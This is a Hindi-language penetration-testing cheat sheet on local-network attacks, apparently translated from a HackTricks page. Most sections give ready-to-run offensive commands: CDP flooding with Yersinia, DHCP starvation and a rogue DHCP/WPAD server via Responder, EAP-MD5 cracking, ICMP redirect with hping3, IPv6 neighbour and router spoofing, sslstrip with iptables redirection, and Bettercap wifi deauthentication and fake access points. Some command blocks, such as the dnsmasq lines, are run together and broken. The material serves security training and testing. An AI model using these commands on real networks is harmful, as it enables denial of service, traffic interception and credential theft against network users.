CISCO Discovery Protocol (CDP) CISCO उपकरणों के बीच संचार के लिए आवश्यक है, जिससे वे **एक-दूसरे की पहचान कर सकें और कॉन्फ़िगरेशन विवरण साझा कर सकें**।

#### पैसिव डेटा संग्रह <a href="#id-0e0f" id="id-0e0f"></a>

CDP को सभी पोर्ट्स के माध्यम से जानकारी प्रसारित करने के लिए कॉन्फ़िगर किया गया है, जो सुरक्षा जोखिम का कारण बन सकता है। एक हमलावर, जब एक स्विच पोर्ट से जुड़ता है, तो वह **Wireshark**, **tcpdump**, या **Yersinia** जैसे नेटवर्क स्निफ़र्स को तैनात कर सकता है। यह क्रिया नेटवर्क उपकरण के बारे में संवेदनशील डेटा प्रकट कर सकती है, जिसमें इसका मॉडल और जिस संस्करण का Cisco IOS वह चलाता है। हमलावर फिर पहचाने गए Cisco IOS संस्करण में विशिष्ट कमजोरियों को लक्षित कर सकता है।

#### CDP टेबल बाढ़ को प्रेरित करना <a href="#id-0d6a" id="id-0d6a"></a>

एक अधिक आक्रामक दृष्टिकोण में स्विच की मेमोरी को ओवरलोड करके Denial of Service (DoS) हमला शुरू करना शामिल है, जो वैध CISCO उपकरणों की तरह व्यवहार करता है। नीचे Yersinia का उपयोग करके इस तरह के हमले को शुरू करने के लिए कमांड अनुक्रम दिया गया है:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
इस हमले के दौरान, स्विच का CPU और CDP पड़ोसी तालिका भारी बोझिल हो जाती है, जो अक्सर **“नेटवर्क लकवाग्रस्त”** के रूप में संदर्भित किया जाता है, अत्यधिक संसाधन खपत के कारण।

#### CDP Impersonation Attack
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
आप [**scapy**](https://github.com/secdev/scapy/) का भी उपयोग कर सकते हैं। सुनिश्चित करें कि आप इसे `scapy/contrib` पैकेज के साथ स्थापित करें।

### VoIP हमले और VoIP Hopper उपकरण

VoIP फोन, जो IoT उपकरणों के साथ बढ़ते हुए एकीकृत होते हैं, दरवाजे खोलने या विशेष फोन नंबरों के माध्यम से थर्मोस्टैट्स को नियंत्रित करने जैसी कार्यक्षमताएँ प्रदान करते हैं। हालाँकि, यह एकीकरण सुरक्षा जोखिम पैदा कर सकता है।

उपकरण [**voiphopper**](http://voiphopper.sourceforge.net) विभिन्न वातावरणों (Cisco, Avaya, Nortel, Alcatel-Lucent) में VoIP फोन का अनुकरण करने के लिए डिज़ाइन किया गया है। यह CDP, DHCP, LLDP-MED, और 802.1Q ARP जैसे प्रोटोकॉल का उपयोग करके वॉयस नेटवर्क का VLAN ID खोजता है।

**VoIP Hopper** Cisco Discovery Protocol (CDP) के लिए तीन मोड प्रदान करता है:

1. **Sniff Mode** (`-c 0`): VLAN ID की पहचान के लिए नेटवर्क पैकेट का विश्लेषण करता है।
2. **Spoof Mode** (`-c 1`): वास्तविक VoIP उपकरण के पैकेट की नकल करते हुए कस्टम पैकेट उत्पन्न करता है।
3. **Spoof with Pre-made Packet Mode** (`-c 2`): एक विशिष्ट Cisco IP फोन मॉडल के पैकेट के समान पैकेट भेजता है।

गति के लिए पसंदीदा मोड तीसरा है। इसके लिए निम्नलिखित निर्दिष्ट करना आवश्यक है:

- हमलावर का नेटवर्क इंटरफेस (`-i` पैरामीटर)।
- अनुकरण किए जा रहे VoIP उपकरण का नाम (`-E` पैरामीटर), जो Cisco नामकरण प्रारूप का पालन करता है (जैसे, SEP के बाद एक MAC पता)।

कॉर्पोरेट सेटिंग्स में, एक मौजूदा VoIP उपकरण की नकल करने के लिए, कोई निम्नलिखित कर सकता है:

- फोन पर MAC लेबल की जांच करें।
- मॉडल जानकारी देखने के लिए फोन की डिस्प्ले सेटिंग्स में जाएं।
- VoIP उपकरण को लैपटॉप से कनेक्ट करें और Wireshark का उपयोग करके CDP अनुरोधों का अवलोकन करें।

उपकरण को तीसरे मोड में निष्पादित करने के लिए एक उदाहरण कमांड होगा:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP हमले

#### गणना
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**DoS के दो प्रकार** DHCP सर्वरों के खिलाफ किए जा सकते हैं। पहला यह है कि **पर्याप्त नकली होस्ट का अनुकरण करें ताकि सभी संभावित IP पते का उपयोग किया जा सके**।\
यह हमला केवल तभी काम करेगा जब आप DHCP सर्वर के उत्तर देख सकें और प्रोटोकॉल को पूरा कर सकें (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server))। उदाहरण के लिए, यह **Wifi नेटवर्क में संभव नहीं है**।

DHCP DoS करने का एक और तरीका है **DHCP-RELEASE पैकेट भेजना जिसमें स्रोत कोड के रूप में हर संभव IP का उपयोग किया जाए**। फिर, सर्वर सोचेगा कि सभी ने IP का उपयोग करना समाप्त कर दिया है।
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
एक अधिक स्वचालित तरीका यह है कि आप उपकरण [DHCPing](https://github.com/kamorin/DHCPig) का उपयोग करें।

आप उल्लेखित DoS हमलों का उपयोग करके क्लाइंट को वातावरण के भीतर नए लीज़ प्राप्त करने के लिए मजबूर कर सकते हैं, और वैध सर्वरों को समाप्त कर सकते हैं ताकि वे अनुत्तरदायी हो जाएं। इसलिए जब वैध पुनः कनेक्ट करने की कोशिश करते हैं, **आप अगले हमले में उल्लेखित दुर्भावनापूर्ण मान सर्वर कर सकते हैं**।

#### दुर्भावनापूर्ण मान सेट करें

एक धोखेबाज़ DHCP सर्वर को `/usr/share/responder/DHCP.py` पर स्थित DHCP स्क्रिप्ट का उपयोग करके सेट किया जा सकता है। यह नेटवर्क हमलों के लिए उपयोगी है, जैसे HTTP ट्रैफ़िक और क्रेडेंशियल्स को कैप्चर करना, ट्रैफ़िक को एक दुर्भावनापूर्ण सर्वर पर रीडायरेक्ट करके। हालाँकि, एक धोखेबाज़ गेटवे सेट करना कम प्रभावी है क्योंकि यह केवल क्लाइंट से आउटबाउंड ट्रैफ़िक को कैप्चर करने की अनुमति देता है, वास्तविक गेटवे से प्रतिक्रियाएँ छूट जाती हैं। इसके बजाय, एक धोखेबाज़ DNS या WPAD सर्वर सेट करना अधिक प्रभावी हमले के लिए अनुशंसित है।

नीचे धोखेबाज़ DHCP सर्वर को कॉन्फ़िगर करने के लिए कमांड विकल्प दिए गए हैं:

- **हमारा IP पता (गेटवे विज्ञापन)**: अपने मशीन के IP को गेटवे के रूप में विज्ञापित करने के लिए `-i 10.0.0.100` का उपयोग करें।
- **स्थानीय DNS डोमेन नाम**: वैकल्पिक रूप से, स्थानीय DNS डोमेन नाम सेट करने के लिए `-d example.org` का उपयोग करें।
- **मूल राउटर/गेटवे IP**: वैध राउटर या गेटवे के IP पते को निर्दिष्ट करने के लिए `-r 10.0.0.1` का उपयोग करें।
- **प्राथमिक DNS सर्वर IP**: आप नियंत्रित किए गए धोखेबाज़ DNS सर्वर के IP पते को सेट करने के लिए `-p 10.0.0.100` का उपयोग करें।
- **द्वितीयक DNS सर्वर IP**: वैकल्पिक रूप से, द्वितीयक DNS सर्वर IP सेट करने के लिए `-s 10.0.0.1` का उपयोग करें।
- **स्थानीय नेटवर्क का नेटमास्क**: स्थानीय नेटवर्क के लिए नेटमास्क को परिभाषित करने के लिए `-n 255.255.255.0` का उपयोग करें।
- **DHCP ट्रैफ़िक के लिए इंटरफ़ेस**: एक विशिष्ट नेटवर्क इंटरफ़ेस पर DHCP ट्रैफ़िक सुनने के लिए `-I eth1` का उपयोग करें।
- **WPAD कॉन्फ़िगरेशन पता**: वेब ट्रैफ़िक इंटरसेप्शन में सहायता करने के लिए WPAD कॉन्फ़िगरेशन के लिए पता सेट करने के लिए `-w “http://10.0.0.100/wpad.dat”` का उपयोग करें।
- **डिफ़ॉल्ट गेटवे IP को स्पूफ करें**: डिफ़ॉल्ट गेटवे IP पते को स्पूफ करने के लिए `-S` शामिल करें।
- **सभी DHCP अनुरोधों का उत्तर दें**: सभी DHCP अनुरोधों का उत्तर देने के लिए `-R` शामिल करें, लेकिन ध्यान रखें कि यह शोर करता है और इसे पता लगाया जा सकता है।

इन विकल्पों का सही उपयोग करके, एक धोखेबाज़ DHCP सर्वर स्थापित किया जा सकता है जो नेटवर्क ट्रैफ़िक को प्रभावी ढंग से इंटरसेप्ट करता है।
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP हमले**

यहाँ कुछ हमले की रणनीतियाँ हैं जो 802.1X कार्यान्वयन के खिलाफ उपयोग की जा सकती हैं:

- EAP के माध्यम से सक्रिय ब्रूट-फोर्स पासवर्ड ग्राइंडिंग
- गलत EAP सामग्री के साथ RADIUS सर्वर पर हमला _\*\*_(शोषण)
- EAP संदेश कैप्चर और ऑफ़लाइन पासवर्ड क्रैकिंग (EAP-MD5 और PEAP)
- TLS प्रमाणपत्र सत्यापन को बायपास करने के लिए EAP-MD5 प्रमाणीकरण को मजबूर करना
- हब या समान का उपयोग करके प्रमाणीकरण करते समय दुर्भावनापूर्ण नेटवर्क ट्रैफ़िक इंजेक्ट करना

यदि हमलावर पीड़ित और प्रमाणीकरण सर्वर के बीच है, तो वह प्रमाणीकरण प्रोटोकॉल को EAP-MD5 में घटित करने की कोशिश कर सकता है और प्रमाणीकरण प्रयास को कैप्चर कर सकता है। फिर, वह इसे ब्रूट-फोर्स कर सकता है:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Attacks <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) एक नेटवर्क प्रोटोकॉल की श्रेणी है जिसे **एक गर्म अतिरिक्त रूटिंग प्रणाली** बनाने के लिए डिज़ाइन किया गया है। FHRP के साथ, भौतिक राउटर को एकल तार्किक डिवाइस में जोड़ा जा सकता है, जो दोष सहिष्णुता को बढ़ाता है और लोड को वितरित करने में मदद करता है।

**Cisco Systems के इंजीनियरों ने दो FHRP प्रोटोकॉल विकसित किए हैं, GLBP और HSRP।**

{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

रूटिंग सूचना प्रोटोकॉल (RIP) के तीन संस्करण ज्ञात हैं: RIP, RIPv2, और RIPng। RIP और RIPv2 द्वारा डाटाग्राम UDP के माध्यम से पोर्ट 520 पर साथियों को भेजे जाते हैं, जबकि RIPng द्वारा डाटाग्राम IPv6 मल्टीकास्ट के माध्यम से UDP पोर्ट 521 पर प्रसारित किए जाते हैं। MD5 प्रमाणीकरण का समर्थन RIPv2 द्वारा पेश किया गया था। दूसरी ओर, RIPng द्वारा स्वदेशी प्रमाणीकरण शामिल नहीं किया गया है; इसके बजाय, IPv6 के भीतर वैकल्पिक IPsec AH और ESP हेडर पर निर्भरता रखी जाती है।

- **RIP और RIPv2:** संचार UDP डाटाग्राम के माध्यम से पोर्ट 520 पर किया जाता है।
- **RIPng:** IPv6 मल्टीकास्ट के माध्यम से डाटाग्राम प्रसारित करने के लिए UDP पोर्ट 521 का उपयोग करता है।

ध्यान दें कि RIPv2 MD5 प्रमाणीकरण का समर्थन करता है जबकि RIPng स्वदेशी प्रमाणीकरण शामिल नहीं करता है, IPv6 में IPsec AH और ESP हेडर पर निर्भर करता है।

### EIGRP Attacks

**EIGRP (Enhanced Interior Gateway Routing Protocol)** एक गतिशील रूटिंग प्रोटोकॉल है। **यह एक दूरी-वेक्तर प्रोटोकॉल है।** यदि **कोई प्रमाणीकरण** और निष्क्रिय इंटरफेस का कॉन्फ़िगरेशन नहीं है, तो एक **आक्रमणकारी** EIGRP रूटिंग में हस्तक्षेप कर सकता है और **रूटिंग तालिकाओं को विषाक्त** कर सकता है। इसके अलावा, EIGRP नेटवर्क (दूसरे शब्दों में, स्वायत्त प्रणाली) **समतल है और किसी भी क्षेत्र में विभाजित नहीं है**। यदि एक **हमलावर एक मार्ग इंजेक्ट करता है**, तो यह संभावना है कि यह मार्ग **स्वायत्त EIGRP प्रणाली** में **फैल जाएगा**।

EIGRP प्रणाली पर हमला करने के लिए **एक वैध EIGRP राउटर के साथ एक पड़ोस स्थापित करना आवश्यक है**, जो बुनियादी अन्वेषण से लेकर विभिन्न इंजेक्शनों तक कई संभावनाओं को खोलता है।

[**FRRouting**](https://frrouting.org/) आपको **BGP, OSPF, EIGRP, RIP और अन्य प्रोटोकॉल का समर्थन करने वाले एक आभासी राउटर को लागू करने की अनुमति देता है।** आपको बस इसे अपने हमलावर के सिस्टम पर तैनात करना है और आप वास्तव में रूटिंग डोमेन में एक वैध राउटर होने का नाटक कर सकते हैं।

{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) EIGRP (Enhanced Interior Gateway Routing Protocol) प्रसारणों को इंटरसेप्ट करने की क्षमताएँ रखता है। यह पैकेट इंजेक्ट करने की भी अनुमति देता है, जिसका उपयोग रूटिंग कॉन्फ़िगरेशन को बदलने के लिए किया जा सकता है।

### OSPF

Open Shortest Path First (OSPF) प्रोटोकॉल में **राउटर के बीच सुरक्षित संचार सुनिश्चित करने के लिए सामान्यतः MD5 प्रमाणीकरण का उपयोग किया जाता है**। हालाँकि, इस सुरक्षा उपाय को Loki और John the Ripper जैसे उपकरणों का उपयोग करके समझौता किया जा सकता है। ये उपकरण MD5 हैश को कैप्चर और क्रैक करने में सक्षम हैं, प्रमाणीकरण कुंजी को उजागर करते हैं। एक बार जब यह कुंजी प्राप्त हो जाती है, तो इसका उपयोग नई रूटिंग जानकारी पेश करने के लिए किया जा सकता है। रूट पैरामीटर को कॉन्फ़िगर करने और समझौता की गई कुंजी स्थापित करने के लिए, _Injection_ और _Connection_ टैब का उपयोग किया जाता है, क्रमशः।

- **MD5 हैश को कैप्चर और क्रैक करना:** इस उद्देश्य के लिए Loki और John the Ripper जैसे उपकरणों का उपयोग किया जाता है।
- **रूट पैरामीटर कॉन्फ़िगर करना:** यह _Injection_ टैब के माध्यम से किया जाता है।
- **समझौता की गई कुंजी सेट करना:** कुंजी _Connection_ टैब के तहत कॉन्फ़िगर की जाती है।

### Other Generic Tools & Sources

- [**Above**](https://github.com/c4s73r/Above): नेटवर्क ट्रैफ़िक को स्कैन करने और कमजोरियों को खोजने के लिए उपकरण
- आप **नेटवर्क हमलों के बारे में कुछ और जानकारी** [**यहाँ**](https://github.com/Sab0tag3d/MITM-cheatsheet) पा सकते हैं।

## **Spoofing**

आक्रमणकारी नए नेटवर्क सदस्य के सभी नेटवर्क पैरामीटर (GW, IP, DNS) को नकली DHCP प्रतिक्रियाएँ भेजकर कॉन्फ़िगर करता है।
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Check the [previous section](./#arp-spoofing).

### ICMPRedirect

ICMP Redirect एक ICMP पैकेट प्रकार 1 कोड 5 भेजने पर आधारित है जो यह संकेत करता है कि हमलावर IP तक पहुँचने का सबसे अच्छा तरीका है। फिर, जब पीड़ित IP से संपर्क करना चाहता है, तो वह पैकेट को हमलावर के माध्यम से भेजेगा।
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

हमलावर कुछ (या सभी) डोमेन को हल करेगा जो पीड़ित पूछता है।
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**dnsmasq के साथ अपना DNS कॉन्फ़िगर करें**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### स्थानीय गेटवे

प्रणालियों और नेटवर्कों के लिए अक्सर कई मार्ग होते हैं। स्थानीय नेटवर्क के भीतर MAC पतों की एक सूची बनाने के बाद, IPv4 फॉरवर्डिंग का समर्थन करने वाले होस्टों की पहचान करने के लिए _gateway-finder.py_ का उपयोग करें।
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

स्थानीय होस्ट समाधान के लिए जब DNS लुकअप असफल होते हैं, Microsoft सिस्टम **Link-Local Multicast Name Resolution (LLMNR)** और **NetBIOS Name Service (NBT-NS)** पर निर्भर करते हैं। इसी तरह, **Apple Bonjour** और **Linux zero-configuration** कार्यान्वयन नेटवर्क के भीतर सिस्टम खोजने के लिए **Multicast DNS (mDNS)** का उपयोग करते हैं। इन प्रोटोकॉल की प्रमाणीकरण रहित प्रकृति और UDP पर उनके संचालन के कारण, संदेशों का प्रसारण करते हुए, हमलावरों द्वारा उपयोगकर्ताओं को दुर्भावनापूर्ण सेवाओं की ओर मोड़ने के लिए इनका शोषण किया जा सकता है।

आप Responder का उपयोग करके होस्ट द्वारा खोजी गई सेवाओं की नकल कर सकते हैं ताकि नकली प्रतिक्रियाएँ भेजी जा सकें।\
[Responder के साथ सेवाओं की नकल कैसे करें](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) के बारे में अधिक जानकारी यहाँ पढ़ें।

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

ब्राउज़र आमतौर पर **Web Proxy Auto-Discovery (WPAD) प्रोटोकॉल का उपयोग करके स्वचालित रूप से प्रॉक्सी सेटिंग्स प्राप्त करते हैं**। इसमें एक सर्वर से कॉन्फ़िगरेशन विवरण प्राप्त करना शामिल है, विशेष रूप से "http://wpad.example.org/wpad.dat" जैसे URL के माध्यम से। क्लाइंट द्वारा इस सर्वर की खोज विभिन्न तंत्रों के माध्यम से हो सकती है:

- **DHCP** के माध्यम से, जहाँ खोज को विशेष कोड 252 प्रविष्टि का उपयोग करके सुविधाजनक बनाया जाता है।
- **DNS** द्वारा, जिसमें स्थानीय डोमेन के भीतर _wpad_ लेबल वाले होस्टनाम की खोज करना शामिल है।
- **Microsoft LLMNR और NBT-NS** के माध्यम से, जो उन मामलों में बैकअप तंत्र के रूप में उपयोग किए जाते हैं जहाँ DNS लुकअप सफल नहीं होते हैं।

टूल Responder इस प्रोटोकॉल का लाभ उठाकर **दुर्भावनापूर्ण WPAD सर्वर** के रूप में कार्य करता है। यह DHCP, DNS, LLMNR, और NBT-NS का उपयोग करके क्लाइंट को अपने साथ जोड़ने के लिए भ्रामक जानकारी प्रदान करता है। Responder का उपयोग करके सेवाओं की नकल कैसे की जा सकती है, इसके बारे में अधिक जानने के लिए [यहाँ देखें](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)।

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

आप नेटवर्क में विभिन्न सेवाएँ प्रदान कर सकते हैं ताकि **एक उपयोगकर्ता को** कुछ **सादा-पाठ क्रेडेंशियल्स** दर्ज करने के लिए **धोखा दिया जा सके**। **इस हमले के बारे में अधिक जानकारी** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)** में है।**

### IPv6 Neighbor Spoofing

यह हमला ARP Spoofing के समान है लेकिन IPv6 की दुनिया में। आप पीड़ित को यह सोचने के लिए मजबूर कर सकते हैं कि GW का IPv6 हमलावर का MAC है।
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 राउटर विज्ञापन धोखाधड़ी/बाढ़

कुछ OS डिफ़ॉल्ट रूप से नेटवर्क में भेजे गए RA पैकेट्स से गेटवे को कॉन्फ़िगर करते हैं। हमलावर को IPv6 राउटर के रूप में घोषित करने के लिए आप उपयोग कर सकते हैं:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

डिफ़ॉल्ट रूप से कुछ ऑपरेटिंग सिस्टम नेटवर्क में DHCPv6 पैकेट पढ़कर DNS को कॉन्फ़िगर करने की कोशिश करते हैं। फिर, एक हमलावर DHCPv6 पैकेट भेज सकता है ताकि वह खुद को DNS के रूप में कॉन्फ़िगर कर सके। DHCP भी पीड़ित को एक IPv6 प्रदान करता है।
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (फेक पेज और JS कोड इंजेक्शन)

## इंटरनेट हमले

### sslStrip

बुनियादी रूप से, यह हमला यह करता है कि यदि **उपयोगकर्ता** एक **HTTP** पृष्ठ को **एक्सेस** करने की कोशिश करता है जो **HTTPS** संस्करण की ओर **रीडायरेक्ट** हो रहा है। **sslStrip** **क्लाइंट के साथ** एक **HTTP कनेक्शन** और **सर्वर के साथ** एक **HTTPS कनेक्शन** **बनाए रखेगा** ताकि यह **स्निफ** कर सके कनेक्शन को **सादा पाठ** में।
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
More info [here](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ और dns2proxy का उपयोग करके HSTS को बायपास करना

**sslStrip+ और dns2proxy** और **sslStrip** के बीच का **अंतर** यह है कि वे **उदाहरण के लिए** _**www.facebook.com**_ को _**wwww.facebook.com**_ **पर** **रिडायरेक्ट** करेंगे (ध्यान दें कि **अतिरिक्त** "**w**" है) और **इस डोमेन का पता हमलावर IP के रूप में सेट करेंगे**। इस तरह, **क्लाइंट** _**wwww.facebook.com**_ **(हमलावर)** से **कनेक्ट** होगा लेकिन पर्दे के पीछे **sslstrip+** **वास्तविक कनेक्शन** को **www.facebook.com** के माध्यम से **बनाए रखेगा**।

इस तकनीक का **लक्ष्य** **HSTS** से **बचना** है क्योंकि _**wwww**.facebook.com_ **ब्राउज़र के कैश** में **सहेजा नहीं जाएगा**, इसलिए ब्राउज़र को **HTTP में फेसबुक प्रमाणीकरण करने के लिए धोखा दिया जाएगा**।\
ध्यान दें कि इस हमले को करने के लिए पीड़ित को पहले [http://www.faceook.com](http://www.faceook.com) पर पहुंचने की कोशिश करनी होगी और न कि https पर। यह एक http पृष्ठ के अंदर लिंक को संशोधित करके किया जा सकता है।

More info [here](https://www.bettercap.org/legacy/#hsts-bypass), [here](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) and [here](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip या sslStrip+ अब काम नहीं करता। इसका कारण यह है कि ब्राउज़रों में HSTS नियम पहले से सहेजे गए हैं, इसलिए भले ही यह किसी उपयोगकर्ता का "महत्वपूर्ण" डोमेन पर पहली बार पहुंचने का समय हो, वह इसे HTTPS के माध्यम से पहुंच जाएगा। इसके अलावा, ध्यान दें कि पहले से सहेजे गए नियम और अन्य उत्पन्न नियम फ्लैग** [**`includeSubdomains`**](https://hstspreload.appspot.com) **का उपयोग कर सकते हैं, इसलिए पहले का _**wwww.facebook.com**_ **उदाहरण अब काम नहीं करेगा क्योंकि** _**facebook.com**_ **HSTS का उपयोग करता है जिसमें `includeSubdomains` है।**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP पोर्ट में सुनना
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL पोर्ट में सुनें

#### कुंजी और स्व-हस्ताक्षरित प्रमाणपत्र उत्पन्न करें
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### प्रमाणपत्र का उपयोग करके सुनें
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### प्रमाणपत्र का उपयोग करके सुनें और होस्ट पर रीडायरेक्ट करें
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
कभी-कभी, यदि क्लाइंट यह जांचता है कि CA एक मान्य है, तो आप **एक अन्य होस्टनेम का प्रमाणपत्र जो CA द्वारा हस्ताक्षरित है** प्रदान कर सकते हैं।\
एक और दिलचस्प परीक्षण है, **अनुरोधित होस्टनेम का प्रमाणपत्र लेकिन स्व-हस्ताक्षरित** प्रदान करना।

परीक्षण करने के लिए अन्य चीजें हैं, जैसे कि प्रमाणपत्र को एक मान्य प्रमाणपत्र के साथ हस्ताक्षरित करने की कोशिश करना जो एक मान्य CA नहीं है। या मान्य सार्वजनिक कुंजी का उपयोग करना, एक एल्गोरिदम का उपयोग करने के लिए मजबूर करना जैसे कि डिफी हेलमैन (एक ऐसा जो वास्तविक निजी कुंजी के साथ कुछ भी डिक्रिप्ट करने की आवश्यकता नहीं है) और जब क्लाइंट वास्तविक निजी कुंजी का एक प्रॉब (जैसे एक हैश) मांगता है, तो एक नकली प्रॉब भेजें और उम्मीद करें कि क्लाइंट इसे जांचेगा नहीं।

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### सक्रिय खोज नोट्स

यह ध्यान में रखें कि जब एक UDP पैकेट एक ऐसे डिवाइस को भेजा जाता है जिसमें अनुरोधित पोर्ट नहीं है, तो एक ICMP (पोर्ट अप्राप्य) भेजा जाता है।

### **ARP खोज**

ARP पैकेट का उपयोग यह पता लगाने के लिए किया जाता है कि नेटवर्क के भीतर कौन से IPs का उपयोग किया जा रहा है। PC को प्रत्येक संभावित IP पते के लिए एक अनुरोध भेजना होता है और केवल वही जो उपयोग में हैं, उत्तर देंगे।

### **mDNS (मल्टीकास्ट DNS)**

Bettercap एक MDNS अनुरोध भेजता है (प्रत्येक X मिलीसेकंड) **\_services\_.dns-sd.\_udp.local** के लिए पूछते हुए, जो मशीन इस पैकेट को देखती है, आमतौर पर इस अनुरोध का उत्तर देती है। फिर, यह केवल "services" का उत्तर देने वाली मशीनों की खोज करता है।

**उपकरण**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (नेटबायोस नाम सर्वर)**

Bettercap पोर्ट 137/UDP पर "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA" नाम के लिए पूछते हुए पैकेट प्रसारित करता है।

### **SSDP (सिंपल सर्विस डिस्कवरी प्रोटोकॉल)**

Bettercap SSDP पैकेट प्रसारित करता है जो सभी प्रकार की सेवाओं की खोज करता है (UDP पोर्ट 1900)।

### **WSD (वेब सेवा खोज)**

Bettercap WSD पैकेट प्रसारित करता है जो सेवाओं की खोज करता है (UDP पोर्ट 3702)।

## संदर्भ

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
